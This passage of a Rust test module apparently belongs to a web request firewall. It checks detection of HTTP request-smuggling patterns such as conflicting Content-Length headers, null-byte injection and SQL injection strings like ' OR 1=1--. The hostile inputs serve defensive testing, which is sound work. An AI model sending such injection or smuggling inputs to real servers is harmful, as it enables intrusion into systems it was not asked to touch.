        let resp = rt.process(&req);
        assert!(resp.total_processing_time_us >= 0.0);
    }

    #[test]
    fn runtime_detects_oversized_header_value() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("header-test");
        req.headers = vec![("X-Oversized".into(), "A".repeat(9 * 1024))];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleH2));
    }

    #[test]
    fn runtime_detects_duplicate_content_type_headers() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("{\"k\":1}");
        req.headers = vec![
            ("Content-Type".into(), "application/json".into()),
            ("content-type".into(), "text/plain".into()),
        ];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleH2));
    }

    #[test]
    fn runtime_handles_mixed_case_http_method() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("ok");
        req.method = "pAtCh".into();
        let resp = rt.process(&req);
        assert!(resp.total_processing_time_us >= 0.0);
    }

    #[test]
    fn runtime_handles_unicode_path() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("unicode-path");
        req.path = "/api/検索/パス/مرحبا".into();
        let resp = rt.process(&req);
        assert!(resp.total_processing_time_us >= 0.0);
    }

    #[test]
    fn runtime_detects_null_bytes_across_string_fields() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("abc\0def");
        req.method = "PO\0ST".into();
        req.path = "/a\0pi".into();
        req.source_hash = "src\0hash".into();
        req.content_type = Some("application/\0json".into());
        req.user_agent = Some("ua\0value".into());
        req.ja3 = Some("771,4865\0".into());
        req.headers = vec![("X-A\0".into(), "b\0c".into())];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::PathNullTerminate));
    }

    #[test]
    fn runtime_detects_multiple_content_length_values() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("body");
        req.headers = vec![
            ("Content-Length".into(), "4".into()),
            ("Content-Length".into(), "9".into()),
        ];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleClTe));
    }

    #[test]
    fn runtime_detects_content_length_zero_with_body() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("non-empty-body");
        req.headers = vec![("Content-Length".into(), "0".into())];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleZeroCl));
    }

    #[test]
    fn runtime_detects_expect_continue_with_body_framing_headers() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("abcdef");
        req.headers = vec![
            ("Expect".into(), "100-continue".into()),
            ("Content-Length".into(), "6".into()),
        ];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleExpect));
    }

    #[test]
    fn weak_source_hash_uses_fallback_identity_for_correlation() {
        let mut rt = UnifiedRuntime::new();
        let mut req1 = make_request("' OR 1=1--");
        req1.source_hash = "a".into();
        req1.headers = vec![("X-Forwarded-For".into(), "203.0.113.8".into())];
        req1.timestamp = 1000;
        let r1 = rt.process(&req1);

        let mut req2 = make_request("' UNION SELECT 1,2--");
        req2.source_hash = "b".into();
        req2.headers = vec![("X-Forwarded-For".into(), "203.0.113.8".into())];
        req2.timestamp = 1001;
        let r2 = rt.process(&req2);

        assert!(r1
            .decision
            .contributors
            .iter()
            .any(|c| c == "source_identity:fallback_hash_applied"));
        assert!(r2
            .decision
            .contributors
            .iter()
            .any(|c| c == "source_identity:fallback_hash_applied"));
        assert!(r2.threat_level >= r1.threat_level);
    }
}
